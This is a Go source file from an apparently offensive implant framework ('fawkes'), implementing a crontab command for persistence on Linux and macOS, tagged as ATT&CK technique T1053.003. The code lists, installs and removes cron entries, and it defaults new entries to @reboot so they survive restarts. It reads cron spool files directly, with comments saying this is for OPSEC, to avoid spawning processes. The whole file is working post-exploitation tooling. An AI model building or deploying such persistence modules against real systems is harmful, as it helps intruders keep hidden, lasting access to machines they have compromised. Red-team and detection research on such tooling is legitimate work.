//go:build !windows

package commands

import (
	"encoding/json"
	"fmt"
	"os"
	"os/user"
	"runtime"
	"strings"

	"fawkes/pkg/structs"
)

type CrontabCommand struct{}

func (c *CrontabCommand) Name() string {
	return "crontab"
}

func (c *CrontabCommand) Description() string {
	return "List, add, or remove cron jobs for persistence (T1053.003)"
}

type crontabArgs struct {
	Action   string `json:"action"`
	Entry    string `json:"entry"`
	User     string `json:"user"`
	Program  string `json:"program"`
	Args     string `json:"args"`
	Schedule string `json:"schedule"`
}

func (c *CrontabCommand) Execute(task structs.Task) structs.CommandResult {
	var args crontabArgs

	if task.Params == "" {
		return errorResult("Error: parameters required. Use action: list, add, remove")
	}

	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		// Plain text fallback: "list", "list root"
		parts := strings.Fields(task.Params)
		args.Action = parts[0]
		if len(parts) > 1 {
			args.User = parts[1]
		}
	}

	switch strings.ToLower(args.Action) {
	case "list":
		return crontabList(args)
	case "add":
		return crontabAdd(args)
	case "remove":
		return crontabRemove(args)
	default:
		return errorf("Unknown action: %s. Use: list, add, remove", args.Action)
	}
}

// crontabList lists current cron jobs by reading spool files directly (no child process).
// Falls back to `crontab -l` if spool files are unreadable.
func crontabList(args crontabArgs) structs.CommandResult {
	username := args.User
	if username == "" {
		if u, err := user.Current(); err == nil {
			username = u.Username
		}
	}

	// Try native file reading first (OPSEC: no process creation)
	if username != "" {
		if content, err := crontabReadSpool(username); err == nil {
			output := strings.TrimSpace(content)
			if output == "" {
				output = "(empty crontab)"
			}
			header := "Current crontab"
			if args.User != "" {
				header += fmt.Sprintf(" for user %s", args.User)
			}
			return successf("%s:\n%s", header, output)
		}
	}

	// Fallback: use crontab binary
	cmdArgs := []string{"-l"}
	if args.User != "" {
		cmdArgs = []string{"-u", args.User, "-l"}
	}

	out, err := execCmdTimeout("crontab", cmdArgs...)
	if err != nil {
		output := strings.TrimSpace(string(out))
		if strings.Contains(output, "no crontab") {
			return successResult(output)
		}
		return errorf("Error listing crontab: %v\n%s", err, output)
	}

	output := strings.TrimSpace(string(out))
	if output == "" {
		output = "(empty crontab)"
	}

	header := "Current crontab"
	if args.User != "" {
		header += fmt.Sprintf(" for user %s", args.User)
	}
	return successf("%s:\n%s", header, output)
}

// crontabReadSpool reads a user's crontab directly from the spool directory.
// Linux: /var/spool/cron/crontabs/<user> (Debian) or /var/spool/cron/<user> (RHEL)
// macOS: /var/at/tabs/<user>
func crontabReadSpool(username string) (string, error) {
	var paths []string
	switch runtime.GOOS {
	case "darwin":
		paths = []string{fmt.Sprintf("/var/at/tabs/%s", username)}
	default:
		paths = []string{
			fmt.Sprintf("/var/spool/cron/crontabs/%s", username), // Debian/Ubuntu
			fmt.Sprintf("/var/spool/cron/%s", username),          // RHEL/CentOS
		}
	}
	for _, path := range paths {
		data, err := os.ReadFile(path)
		if err == nil {
			return string(data), nil
		}
	}
	return "", fmt.Errorf("crontab spool not readable")
}

// crontabAdd adds a cron job entry
func crontabAdd(args crontabArgs) structs.CommandResult {
	var entry string

	if args.Entry != "" {
		// Use raw entry (e.g., "*/5 * * * * /path/to/command")
		entry = args.Entry
	} else if args.Program != "" {
		// Build entry from schedule + program + args
		schedule := args.Schedule
		if schedule == "" {
			schedule = "@reboot" // Default to persistence on reboot
		}
		if args.Args != "" {
			entry = fmt.Sprintf("%s %s %s", schedule, args.Program, args.Args)
		} else {
			entry = fmt.Sprintf("%s %s", schedule, args.Program)
		}
	} else {
		return errorResult("Error: provide either 'entry' (raw cron line) or 'program' (with optional schedule/args)")
	}

	// Get existing crontab
	cmdArgs := []string{"-l"}
	if args.User != "" {
		cmdArgs = []string{"-u", args.User, "-l"}
	}

	existing, err := execCmdTimeoutOutput("crontab", cmdArgs...)
	if err != nil {
		existing = []byte{} // No existing crontab is fine
	}

	// Append new entry
	newCrontab := strings.TrimRight(string(existing), "\n")
	if newCrontab != "" {
		newCrontab += "\n"
	}
	newCrontab += entry + "\n"

	// Write new crontab
	installArgs := []string{"-"}
	if args.User != "" {
		installArgs = []string{"-u", args.User, "-"}
	}
	cmd, cancel := execCmdCtx("crontab", installArgs...)
	defer cancel()
	cmd.Stdin = strings.NewReader(newCrontab)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return errorf("Error installing crontab: %v\n%s", err, string(out))
	}

	return successf("Added cron entry:\n  %s", entry)
}

// crontabRemove removes a cron job entry by matching text
func crontabRemove(args crontabArgs) structs.CommandResult {
	if args.Entry == "" && args.Program == "" {
		return errorResult("Error: provide 'entry' (exact line) or 'program' (path substring) to identify which entry to remove")
	}

	// Get existing crontab
	cmdArgs := []string{"-l"}
	if args.User != "" {
		cmdArgs = []string{"-u", args.User, "-l"}
	}

	existing, err := execCmdTimeoutOutput("crontab", cmdArgs...)
	if err != nil {
		return errorResult("Error: no crontab exists to remove entries from")
	}

	// Filter out matching lines
	matchStr := args.Entry
	if matchStr == "" {
		matchStr = args.Program
	}

	lines := strings.Split(string(existing), "\n")
	var kept []string
	removedCount := 0
	for _, line := range lines {
		if strings.Contains(line, matchStr) {
			removedCount++
			continue
		}
		kept = append(kept, line)
	}

	if removedCount == 0 {
		return errorf("No cron entries matching '%s' found", matchStr)
	}

	// Install updated crontab
	newCrontab := strings.Join(kept, "\n")
	installArgs := []string{"-"}
	if args.User != "" {
		installArgs = []string{"-u", args.User, "-"}
	}
	cmd, cancel := execCmdCtx("crontab", installArgs...)
	defer cancel()
	cmd.Stdin = strings.NewReader(newCrontab)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return errorf("Error installing updated crontab: %v\n%s", err, string(out))
	}

	return successf("Removed %d cron entry(ies) matching '%s'", removedCount, matchStr)
}
